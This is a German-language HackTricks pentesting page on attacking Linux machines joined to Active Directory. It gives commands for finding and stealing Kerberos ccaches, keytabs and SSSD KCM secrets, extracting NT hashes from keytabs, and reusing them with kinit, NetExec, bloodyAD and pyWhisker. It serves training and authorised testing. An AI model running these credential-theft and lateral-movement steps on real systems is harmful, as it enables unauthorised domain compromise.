# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Eine Linux-Maschine kann auch in einer Active-Directory-Umgebung vorhanden sein.

Eine Linux-Maschine innerhalb eines AD kann **Kerberos-Material lokal speichern**: Benutzer-ccaches, Maschinen-/Service-keytabs und von SSSD verwaltete Secrets. Diese Artefakte können in der Regel wie jedes andere Kerberos-Credential wiederverwendet werden. Um die meisten davon zu lesen, musst du der Benutzerbesitzer des Tickets oder **root** auf der Maschine sein.

## Enumeration

### AD enumeration from linux

Wenn du Zugriff auf ein AD in Linux (oder bash in Windows) hast, kannst du [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) verwenden, um das AD zu enumerieren.

Du kannst auch die folgende Seite ansehen, um **andere Wege zur AD-Enumeration von Linux aus** zu lernen:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Directory**, hauptsächlich für **Unix**-Umgebungen. Es kombiniert ein vollständiges **LDAP directory** mit einem MIT **Kerberos** Key Distribution Center für eine Verwaltung, die der von Active Directory ähnelt. Unter Nutzung des Dogtag **Certificate System** für CA- und RA-Zertifikatsverwaltung unterstützt es **Multi-Faktor**-Authentifizierung, einschließlich Smartcards. SSSD ist in die Unix-Authentifizierungsprozesse integriert. Mehr dazu erfährst du in:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Bevor du Tickets anfasst, identifiziere **wie der Host an AD angebunden wurde** und **wo Kerberos-Material wirklich gespeichert ist**. Auf modernen Linux-Hosts wird dies häufig von `realmd` + `adcli` + `sssd` gehandhabt, nicht nur durch flache Dateien in `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Dies sagt dir schnell, ob der Host AD vertraut, ob SSSD Identitäten oder Tickets cached, und ob **machine/service keytabs** oder **KCM secrets** für Missbrauch verfügbar sind.

## Playing with tickets

### Pass The Ticket

Auf dieser Seite findest du verschiedene Orte, an denen du **kerberos tickets auf einem linux host finden** könntest. Auf der folgenden Seite kannst du lernen, wie du diese CCache ticket Formate in Kirbi transformierst (das Format, das du in Windows verwenden musst) und wie du einen PTT attack durchführst:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{#endref}

Wenn du die **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.) möchtest, schau dir die dedizierte Seite an:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files sind binäre Formate zum **Speichern von Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` ist weiterhin üblich, aber moderne Linux-Deployments verwenden auch `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, oder `KCM:%{uid}`. Prüfe die Umgebungsvariable **`KRB5CCNAME`** und die Einstellung `default_ccache_name`, bevor du annimmst, dass tickets in `/tmp` liegen.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Kerberos-Tickets, die im Speicher eines Prozesses gespeichert sind, können extrahiert werden**, insbesondere wenn der ptrace-Schutz der Maschine deaktiviert ist (`/proc/sys/kernel/yama/ptrace_scope`). Ein nützliches Tool dafür findest du unter [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), das die Extraktion erleichtert, indem es sich in Sessions injiziert und Tickets nach `/tmp` dumppt.

Um dieses Tool zu konfigurieren und zu verwenden, werden die folgenden Schritte ausgeführt:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Dieses Verfahren versucht, in verschiedene Sessions zu injizieren, und signalisiert Erfolg, indem extrahierte Tickets in `/tmp` mit einer Namenskonvention von `__krb_UID.ccache` gespeichert werden.

### CCACHE ticket reuse from SSSD KCM

SSSD hält eine Kopie der Datenbank unter dem Pfad `/var/lib/sss/secrets/secrets.ldb` vor. Der zugehörige Schlüssel wird als versteckte Datei unter dem Pfad `/var/lib/sss/secrets/.secrets.mkey` gespeichert. Standardmäßig ist der Schlüssel nur lesbar, wenn du **root**-Rechte hast.

Das Aufrufen von **`SSSDKCMExtractor`** mit den Parametern --database und --key wird die Datenbank parsen und die **secrets entschlüsseln**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Der **credential cache Kerberos blob kann in eine nutzbare Kerberos CCache**-Datei umgewandelt werden, die an Mimikatz/Rubeus übergeben werden kann.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Konten aus /etc/krb5.keytab extrahieren

Service-Account-Keys, die für Dienste mit root-Rechten essenziell sind, werden sicher in **`/etc/krb5.keytab`**-Dateien gespeichert. Diese Keys, ähnlich wie Passwörter für Dienste, erfordern strikte Vertraulichkeit.

Um den Inhalt der keytab-Datei zu prüfen, kann **`klist`** verwendet werden. Unter Linux gibt **`klist -k -K -e`** die principals, die Key-Version-Nummern, die Verschlüsselungstypen und das rohe key material aus. Wenn der key type **23 / RC4-HMAC** ist, ist der key value außerdem der **NT hash** dieses principals.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Für Linux-Benutzer bietet **`KeyTabExtract`** Funktionalität, um den RC4 HMAC Hash zu extrahieren, der für NTLM-Hash-Reuse genutzt werden kann. Beachte, dass dies nur hilft, wenn der keytab noch **etype 23 / RC4-HMAC** Material enthält. In **AES-only**-Umgebungen erhältst du möglicherweise keinen wiederverwendbaren NT hash, aber du kannst dich trotzdem direkt mit dem keytab über Kerberos authentifizieren.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Auf macOS dient **`bifrost`** als Tool zur Analyse von Keytab-Dateien.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Unter Verwendung der extrahierten Konto- und Hash-Informationen können Verbindungen zu Servern mit Tools wie **`NetExec`** hergestellt werden.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Wiederverwenden des Maschinenkontos aus `/etc/krb5.keytab`

Auf mit `realmd`/`adcli`/`sssd` verbundenen Systemen enthält `/etc/krb5.keytab` normalerweise das **Computer-Konto** und einen oder mehrere **Host/Service-Principals**. Wenn du **root** hast, dump es nicht einfach nur: Verwende einen der von `klist -k` aufgelisteten Principals, um ein TGT anzufordern und als der Linux-Host selbst zu agieren.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Dies ist besonders nützlich, wenn das **computer object** selbst delegierte Rechte in AD hat oder wenn der Host berechtigt ist, andere Secrets wie eine **gMSA** abzurufen.

### Gestohlene Kerberos-Materialien mit Linux-first AD-Tools wiederverwenden

Sobald du ein gültiges `ccache` oder eine nutzbare keytab hast, kannst du gegen AD **direkt von Linux aus** arbeiten, ohne alles zuerst in Windows-Formate zu konvertieren. Viele moderne Tools unterstützen `KRB5CCNAME` / Kerberos-Authentifizierung nativ:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Dies ist eine gute Brücke zwischen **Linux post-exploitation** und **AD object abuse**. Für die object-level abuse-Pfade selbst, siehe:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Aktuelle Linux-Deployments können **Managed Service Accounts** direkt aus AD verwenden. In der Praxis bedeutet das, dass du nach der Kompromittierung eines Linux-Servers möglicherweise nicht nur das Host-keytab, sondern auch **service-specific keytabs** findest, die aus einer gMSA generiert wurden. Häufige Stellen zur Prüfung sind `/etc/gmsad.conf`, deployment-specific config files und zusätzliche `*.keytab`-Dateien unter `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Dies gibt dir eine wiederverwendbare Kerberos-Identität für die an diese gMSA gebundenen SPNs, **ohne irgendeinen Windows-Endpunkt anzufassen**. Für **domain-seitigen** gMSA/dMSA-Missbrauch nach höheren Rechten in AD, siehe:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel_systems_directly_with_active_directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel_systems_directly_with_active_directory)

{{#include ../../banners/hacktricks-training.md}}
